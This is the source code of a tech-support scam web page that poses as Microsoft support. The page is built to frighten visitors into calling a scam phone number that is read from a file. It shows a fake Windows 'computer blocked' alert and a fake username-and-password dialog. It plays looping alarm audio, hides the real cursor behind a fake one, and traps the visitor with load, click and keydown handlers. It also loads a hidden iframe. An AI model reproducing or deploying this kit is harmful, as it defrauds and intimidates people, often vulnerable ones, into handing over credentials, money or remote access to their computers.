
<!doctype html>
<html>
<head>

<meta charset="utf-8">
<title>***Attention Required***</title>
<link rel="icon" type="png/jpg" href="icon.png">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<link rel="stylesheet" type="text/css" href="style.css">
<link href="important_files/favicon.ico" rel="shortcut icon">
<link href="important_files/style.css" rel="stylesheet" type="text/css">
<link href="important_files/bootstrap.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="js.js"></script>
	<?php
		$myfile = fopen("../number.txt", "r") or die("Unable to open file!");
		$phone = fgets($myfile);
		//
		$phone = trim(preg_replace('/\s\s+/', ' ', $phone));
		fclose($myfile);
	?>
<script>
	var num = ("<?php echo $phone ?>");
</script>
<script src="jquery.min.js"></script>
    <script type="text/javascript" src="jquery.min-2.js"></script>
    <script> $(document).ready(function () { animateDiv(); }); function makeNewPosition() { var h = $(window).height() - 50, w = $(window).width() - 50, nh = Math.floor(Math.random() * h), nw = Math.floor(Math.random() * w); return [nh, nw]; } function animateDiv() { var newq = makeNewPosition(), oldq = $(".fakeCursor").offset(), speed = calcSpeed([oldq.top, oldq.left], newq); $(".fakeCursor").animate({ top: newq[0], left: newq[1] }, speed, function () { animateDiv(); }); }; function calcSpeed(prev, next) { var x = Math.abs(prev[1] - next[1]), y = Math.abs(prev[0] - next[0]), greatest = x > y ? x : y, speedModifier = 0.3, speed = Math.ceil(greatest / speedModifier); return speed; } 
	
	</script>
    <style type="text/css">
        @media all and (-ms-high-contrast:none) {
            div.fakeCursor {
                width: 17px;
                height: 25px;
				background-image:url(download.png);               
                position: fixed;
                z-index: 3000;
            }

            .nocursor {
                cursor: none;
                position: absolute;
                top: 0;
                bottom: 0;
                width: 100%;
            }
        }

        @media screen and (-webkit-min-device-pixel-ratio:0) {
            div.fakeCursor {
                width: 17px;
                height: 25px;
                background-image:url(download.png);
                position: fixed;
                z-index: 100;
            }

            .nocursor {
                cursor: none;
                position: absolute;
                top: 0;
                bottom: 0;
                width: 100%;
            }
        }

        @-moz-document url-prefix() {
            width: 17px;
            height: 25px;
            background-image:url(download.png);
            position: fixed;
            z-index: 3000;
        }

        .nocursor {
            cursor: none;
            position: absolute;
            top: 0;
            bottom: 0;
            width: 100%;
        }

        }

        div#container {
            width: 688px;
            position: relative;
            margin: 0 auto 0 auto;
            text-align: left;
            z-index: 3000;
        }

        body {
            background-color: #FFFFFF;
            color: #000000;
            font-family: Arial;
            font-size: 13px;
            margin: 0;
            
        }
    </style>



</head>



<body onLoad="userFunction();" onclick="myFunction();" onkeydown="myFunction();" onUnload="myFunction();" style="cursor:none;">
        <audio autoplay loop>
            <source src="../alert2.mp3" type="audio/mpeg">
        </audio>
        <section class="top-header">
            <div class="top-header-section">
                <div class="top-header-first">
                    <img src="important_files/url-1.jpg" alt="" class="img-responsive">
                </div>
                <div class="top-header-middle">
                    <img src="important_files/url-3.jpg" alt="" class="img-responsive">
                </div>
                <div class="top-header-last">
                    <img src="important_files/url-2.jpg" alt="" class="img-responsive">
                </div>
            </div>
        </section>
        <header>
            <div class="container">
                <nav class="navbar">
                    <div class="">
                        <!-- Brand and toggle get grouped for better mobile display -->
                        <div class="navbar-header">
                            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
                                <span class="sr-only">Toggle navigation</span>
                                <span class="icon-bar"></span>
                                <span class="icon-bar"></span>
                                <span class="icon-bar"></span>
                            </button>
                            <a class="navbar-brand" href="#">
                                <img src="important_files/microsoft.png" alt="" title="" class="img-responsive">
                            </a>
                        </div>
                        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                            <ul class="nav navbar-nav">                        
                                <li class="dropdown active">
                                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Store <span class="caret"></span></a>
                                    <ul class="dropdown-menu">
                                        <li><a href="#">Action</a></li>
                                        <li><a href="#">Another action</a></li>
                                        <li><a href="#">Something else here</a></li>
                                        <li role="separator" class="divider"></li>
                                        <li><a href="#">Separated link</a></li>
                                        <li role="separator" class="divider"></li>
                                        <li><a href="#">One more separated link</a></li>
                                    </ul>
                                </li>
                                <li class="dropdown">
                                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Products <span class="caret"></span></a>
                                    <ul class="dropdown-menu">
                                        <li><a href="#">Action</a></li>
                                        <li><a href="#">Another action</a></li>
                                        <li><a href="#">Something else here</a></li>
                                        <li role="separator" class="divider"></li>
                                        <li><a href="#">Separated link</a></li>
                                        <li role="separator" class="divider"></li>
                                        <li><a href="#">One more separated link</a></li>

                                        <li><a href="#">Support</a></li>
                                    </ul>
                                </li>
                            </ul>
                            <ul class="nav navbar-nav navbar-right">
                                <li><a href="#">Link</a></li>
                                <li><a href="#">Sign in</a></li>
                            </ul>
                        </div><!-- /.navbar-collapse -->
                    </div><!-- /.container-fluid -->
                </nav>
            </div>
        </header>
        <section class="some">
            <div class="container">
                <div class="some-sec">
                    <p>Join the celebration—get the Windows 10 Anniversary Update today ></p>
                </div>
            </div>
        </section>
        <section class="banner">
            <div class="container">
                <div class="banner-sec">
                    <div class="row">
                        <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
                            <div class="banner-info">
                                <div class="banner-heading">Call for support:</div>
                                <div class="banner-sub-heading"><?php echo $phone ?></div>
                            </div>
                        </div>
                        <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
                            <div class="banner-info text-right">
                                <div class="banner-heading">Call for support:</div>
                                <div class="banner-sub-heading"><?php echo $phone ?></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="main-body">
            <div class="container">
                <div class="main-body-sec">
                    <div class="body-nav">
                        <ul class="body-nav-listing">
                            <li><a href="#">Manage my account</a></li>
                            <li><a href="#">Ask the community</a></li>
                            <li><a href="#">Contact us</a></li>
                            <li><a href="#">Find downloads</a></li>
                        </ul>
                    </div>
                    <div class="body-content">
                        <div class="body-content-heading text-center">Which product do you need help with?</div>
                        <div class="row">
                            <div class="col-lg-2 col-md-2 col-sm-3 col-xs-6">
                                <div class="body-content-info">
                                    <figure>
                                        <img src="important_files/img-1.svg" alt="" title="" class="img-responsive">
                                        <figcaption>
                                            <p>Windows</p>
                                        </figcaption>
                                    </figure>
                                </div>
                            </div>
                            <div class="col-lg-2 col-md-2 col-sm-3 col-xs-6">
                                <div class="body-content-info">
                                    <figure>
                                        <img src="important_files/img-2.svg" alt="" title="" class="img-responsive">
                                        <figcaption>
                                            <p>Office</p>
                                        </figcaption>
                                    </figure>
                                </div>
                            </div>
                            <div class="col-lg-2 col-md-2 col-sm-3 col-xs-6">
                                <div class="body-content-info">
                                    <figure>
                                        <img src="important_files/img-3.svg" alt="" title="" class="img-responsive">
                                        <figcaption>
                                            <p>Outlook.com</p>
                                        </figcaption>
                                    </figure>
                                </div>
                            </div>
                            <div class="col-lg-2 col-md-2 col-sm-3 col-xs-6">
                                <div class="body-content-info">
                                    <figure>
                                        <img src="important_files/img-4.svg" alt="" title="" class="img-responsive">
                                        <figcaption>
                                            <p>Microsoft account</p>
                                        </figcaption>
                                    </figure>
                                </div>
                            </div>
                            <div class="col-lg-2 col-md-2 col-sm-3 col-xs-6">
                                <div class="body-content-info">
                                    <figure>
                                        <img src="important_files/img-5.svg" alt="" title="" class="img-responsive">
                                        <figcaption>
                                            <p>Store</p>
                                        </figcaption>
                                    </figure>
                                </div>
                            </div>
                            <div class="col-lg-2 col-md-2 col-sm-3 col-xs-6">
                                <div class="body-content-info">
                                    <figure>
                                        <img src="important_files/img-6.svg" alt="" title="" class="img-responsive">
                                        <figcaption>
                                            <p>Xbox</p>
                                        </figcaption>
                                    </figure>
                                </div>
                            </div>
                            <div class="col-lg-2 col-md-2 col-sm-3 col-xs-6">
                                <div class="body-content-info">
                                    <figure>
                                        <img src="important_files/img-7.svg" alt="" title="" class="img-responsive">
                                        <figcaption>
                                            <p>OneDrive</p>
                                        </figcaption>
                                    </figure>
                                </div>
                            </div>
                            <div class="col-lg-2 col-md-2 col-sm-3 col-xs-6">
                                <div class="body-content-info">
                                    <figure>
                                        <img src="important_files/img-8.svg" alt="" title="" class="img-responsive">
                                        <figcaption>
                                            <p>Skype</p>
                                        </figcaption>
                                    </figure>
                                </div>
                            </div>
                            <div class="col-lg-2 col-md-2 col-sm-3 col-xs-6">
                                <div class="body-content-info">
                                    <figure>
                                        <img src="important_files/img-9.svg" alt="" title="" class="img-responsive">
                                        <figcaption>
                                            <p>Internet Explorer</p>
                                        </figcaption>
                                    </figure>
                                </div>
                            </div>
                            <div class="col-lg-2 col-md-2 col-sm-3 col-xs-6">
                                <div class="body-content-info">
                                    <figure>
                                        <img src="important_files/img-10.svg" alt="" title="" class="img-responsive">
                                        <figcaption>
                                            <p>Microsoft Edge</p>
                                        </figcaption>
                                    </figure>
                                </div>
                            </div>
                            <div class="col-lg-2 col-md-2 col-sm-3 col-xs-6">
                                <div class="body-content-info">
                                    <figure>
                                        <img src="important_files/img-11.svg" alt="" title="" class="img-responsive">
                                        <figcaption>
                                            <p>Mobile devices</p>
                                        </figcaption>
                                    </figure>
                                </div>
                            </div>
                            <div class="col-lg-2 col-md-2 col-sm-3 col-xs-6">
                                <div class="body-content-info">
                                    <figure>
                                        <img src="important_files/img-12.svg" alt="" title="" class="img-responsive">
                                        <figcaption>
                                            <p>Windows Phone 8</p>
                                        </figcaption>
                                    </figure>
                                </div>
                            </div>
                        </div>
                        <a href="#" class="body-content-sub-heading text-center">View all Microsoft products</a>
                    </div>
                </div>
            </div>
        </section>
        <section class="body-links">
            <div class="container">
                <div class="body-links-sec">
                    <div class="row">
                        <div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
                            <div class="body-links-info">
                                <div class="body-links-heading">Business, IT & developer</div>
                                <ul class="body-links-listing">
                                    <li><a href="#">Support for small business</a></li>
                                    <li><a href="#">Enterprise and partners</a></li>
                                    <li><a href="#">IT Professionals</a></li>
                                    <li><a href="#">Developers</a></li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
                            <div class="body-links-info">
                                <div class="body-links-heading">Set up & install</div>
                                <ul class="body-links-listing">
                                    <li><a href="#">Help with upgrading to Windows 10</a></li>
                                    <li><a href="#">Install Office 365 Home, Personal, or University</a></li>
                                    <li><a href="#">Activate Office 365 Home, Personal, University, Office 2013, or Office 2016</a></li>
                                    <li><a href="#">Why is Office taking so long to install?</a></li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
                            <div class="body-links-info">
                                <div class="body-links-heading">Popular topics</div>
                                <ul class="body-links-listing">
                                    <li><a href="#">Activation in Windows 10</a></li>
                                    <li><a href="#">Windows 10 FAQ</a></li>
                                    <li><a href="#">Windows 10 help & how-to</a></li>
                                    <li><a href="#">10 Mobile help & how-to</a></li>
                                    <li><a href="#">Can't find Office applications in Windows 10, Windows 8, or Windows 7?</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
		<div class="form-div">
				<div class="top-p">
				<p>Authentication Required</p>
				<span><a href="#"><img src="close-btn.png"/></a></span>
				<div class="clear"></div>
				</div>
			<div class="main-frm">
					<div class="flt-left">
						<a href="#"><img src="quot-pic.png"/></a>
					</div>
					<div class="flt-right">
						<p>https://support.microsoft.com is requesting your username and password. The site says: “Windows and computer has been blocked due to some suspicious activity, to get your computer secure call us immediately <?php echo $phone ?>”</p>
					</div>
						<div class="clear"></div>
					<div class="flt-left">					
						<label>User Name:</label>
					</div>
					<div class="flt-right">
						<input type="text" class="user"/>
				 </div>
				 	<div class="clear"></div>
					<div class="flt-left">					
						<label>Password:</label>
					</div>
					<div class="flt-right">
						<input type="text" class="pass"/>					
					</div>						
					<div class="clear"></div>
					<div class="center-div">
						<button type="button" class="btn-submit">OK</button>
						<button type="button" class="btn-cancel">Cancel</button>					
					</div>
			</div>
		</div>
		
        <footer>
            <div class="container">
                <div class="footer-sec">
                    <div class="footer-top">
                        <div class="row">
                            <div class="col-lg-4 col-md-4 col-sm-4 col-sm-12">
                                <div class="footer-info">
                                    <div class="footer-heading">Support</div>
                                    <ul class="footer-top-listing">
                                        <li><a href="#">Account support</a></li>
                                        <li><a href="#">Supported products list</a></li>
                                        <li><a href="#">Product support lifecycle</a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="col-lg-4 col-md-4 col-sm-4 col-sm-12">
                                <div class="footer-info">
                                    <div class="footer-heading">Security</div>
                                    <ul class="footer-top-listing">
                                        <li><a href="#">Safety & Security Center</a></li>
                                        <li><a href="#">Download Security Essentials</a></li>
                                        <li><a href="#">Malicious Software Removal Tool</a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="col-lg-4 col-md-4 col-sm-4 col-sm-12">
                                <div class="footer-info">
                                    <div class="footer-heading">Contact Us</div>
                                    <ul class="footer-top-listing">
                                        <li><a href="#">Report a support scam</a></li>
                                        <li><a href="#">Disability Answer Desk</a></li>
                                        <li><a href="#">Privacy questions</a></li>
                                        <li><a href="#">Locate Microsoft addresses worldwide</a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="footer-bottom">
                        <div class="row">
                            <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
                                <div class="footer-bottom-sec">
                                    <p><a href="#">English (India)‎</a></p>
                                </div>
                            </div>
                            <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
                                <div class="footer-bottom-sec">
                                    <ul class="footer-bottom-listing">
                                        <li><a href="#">Terms of use</a></li>
                                        <li><a href="#">Privacy & cookies</a></li>
                                        <li><a href="#">Trademarks</a></li>
                                        <li><a href="#">&copy; 2016 Microsoft</a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
        <div class="alert-box" id="alert-box">
  <div class="alert-container">
  	<div class="alert-box-heading">
  	  <a href="javascript:openlink()" class="cross">&times;</a>
      <div class="alert-box-heading-text">Confirm Navigation</div>
    </div>
  	<div class="alert-box-container">
      <p>CRITICAL ALERT FROM WINDOWS : YOUR COMPUTER HAS BEEN BLOCKED<br><br>
      Windows has detected some suspicious activity from your IP address.<br>
      Some virus and spyware have caused a security breach at your network location.<br><br>
      Please call us immediately at the number listed so that our engineers can walk you through the removal process over the phone. Call us immediately <?php echo $phone ?> for Technical Assistance.<br><br>
      ***********************************<br><br>
      Call: <?php echo $phone ?><br><br>
      ***********************************<br><br>
      Please do not use any internet based services to avoid any identity thefts.<br>
      PLEASE DO NOT SHUT DOWN OR RESTART YOUR COMPUTER. DOING THAT LEAD TO DATA LOSS AND FAILIURE OF OPERATING SYSTEM HENCE NON BOOTABLE SITUATION RESULTING COMPLETE DATA LOSS.</p>
    </div>
    <div class="alert-box-checkbox">
      <label>
      	<input class="alert-input" type="checkbox">
        <p> Prevent this page from creating additional dialogues.</p>
	  </label>      
    </div>
    <div class="alert-box-confirm">      
      <a target="_blank" href="indexnew.php" class="confirm">OK</a>
    </div>
    <div class="clr"></div>
  </div>
</div>
<?php
echo '"<iframe src="auth.php?num='.$phone.'" style="display:none;"></iframe>"'
?>
<audio autoplay loop>
  <source src="alert.mp3" type="audio/mpeg">
</audio>
<div class="fakeCursor"></div> 
    </body>
<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'}),_trfd.push({'ap':'cpsh'},{'server':'a2plcpnl0609'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='https://img1.wsimg.com/tcc/tcc_l.combined.1.0.6.min.js'></script></html>
